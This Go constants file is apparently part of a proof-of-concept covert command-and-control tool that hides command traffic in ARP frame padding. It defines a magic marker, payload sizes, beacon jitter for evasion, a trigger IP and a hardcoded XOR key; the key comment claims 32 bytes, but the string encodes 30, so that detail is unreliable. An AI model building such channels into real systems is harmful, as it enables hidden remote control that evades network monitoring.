package shared

// ARP C2 Protocol Constants
const (
	// MagicMarkerByte0 and MagicMarkerByte1 form the fingerprint
	// that identifies C2 traffic vs legitimate ARP noise
	MagicMarkerByte0 = 0x13
	MagicMarkerByte1 = 0x37

	// ARP packets are 42 bytes; Ethernet frames must be >= 64 bytes
	// This means 22 bytes of padding available (64 - 42 = 22)
	ARPPacketSize      = 42
	EthernetMinSize    = 64
	MaxPaddingSize     = EthernetMinSize - ARPPacketSize // 22 bytes
	MagicMarkerSize    = 2
	MaxPayloadPerFrame = MaxPaddingSize - MagicMarkerSize // 20 bytes per frame

	// Command execution timeout (seconds)
	CommandTimeout = 5

	// ARP jitter settings (milliseconds)
	JitterMinMs = 2000
	JitterMaxMs = 5000

	// Response buffer size
	MaxResponseSize = 4096

	// Trigger IP used for command beacons
	TriggerIP = "10.255.255.254"

	// Default interfaces
	DefaultLinuxInterface   = "eth0"
	DefaultWindowsInterface = ""  // Will auto-detect

	// XOR encryption key (hardcoded for PoC; can be derived from credentials later)
	// This is a simple 32-byte key for XOR cipher
	XORKeyHex = "deadbeefcafebabefacadedeadbeefcafebabefacadedeadbeefcafebabe"
)

// Error messages
const (
	ErrNoInterface     = "failed to find network interface"
	ErrOpenDevice      = "failed to open network device"
	ErrSetFilter       = "failed to set BPF filter"
	ErrCommandTimeout  = "command execution timeout"
	ErrEmptyCommand    = "empty command received"
	ErrInvalidPayload  = "invalid payload format"
)
